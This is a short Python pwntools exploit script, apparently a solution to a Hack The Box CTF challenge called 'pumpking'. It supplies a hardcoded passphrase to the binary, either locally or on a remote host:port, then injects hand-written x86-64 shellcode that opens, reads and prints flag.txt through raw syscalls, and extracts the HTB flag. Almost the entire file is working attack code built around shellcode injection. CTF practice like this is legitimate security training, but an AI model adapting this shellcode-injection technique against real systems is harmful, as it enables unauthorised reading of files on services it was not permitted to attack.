#!/usr/bin/env pyhton3

from pwn import *

context.binary = 'pumpking_patched'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'First of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: ', b'pumpk1ngRulez')

    shellcode = asm(f'''
        xor  rdx, rdx
        push rdx
        mov  rsi, {u64(b'flag.txt')}
        push rsi
        mov  rsi, rsp
        xor  rdi, rdi
        sub  rdi, 100
        mov  rax, 0x101
        syscall

        mov  rdx, 100
        mov  rsi, rsp
        mov  edi, eax
        xor  rax, rax
        syscall

        mov   al, 1
        mov  rdi, rax
        syscall

        mov  al, 0x3c
        syscall
    ''')

    log.info(f'Shellcode length: {hex(len(shellcode))}')

    sleep(1)
    p.send(shellcode)
    sleep(1)

    log.success(re.findall(br'HTB{.*?}', p.recv())[0].decode())
    p.close()


if __name__ == '__main__':
    main()
